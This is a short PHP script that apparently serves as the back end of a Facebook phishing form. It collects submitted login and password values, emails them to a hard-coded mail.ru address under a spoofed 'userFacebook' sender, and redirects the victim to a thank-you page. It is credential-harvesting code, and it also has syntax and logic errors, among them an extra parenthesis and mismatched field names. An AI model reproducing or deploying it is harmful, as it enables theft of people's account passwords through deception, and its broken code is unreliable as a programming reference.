<?php
if (!empty($_POST['login']) AND !empty($_POST['password']))) 
{
    $headers = 'From: userFacebook' .
                'Reply-To: gevor.ghukasyan2002@mail.ru' .
                'X-Mailer: PHP/' . phpversion();
         
    $theme = "New massage from facebook";             
             
    $letter = "Post Data:\r\n";
    $letter .="";
    $letter .="Login: ".$_POST['Login'].'\r\n';
    $letter .="password: ".$_POST['password'].'\r\n';
    
    if (mail("gevor.ghukasyan2002@mail.ru", $theme, $letter, $headers)){
      header("Location: /testform/thankYou.html");
    }
}
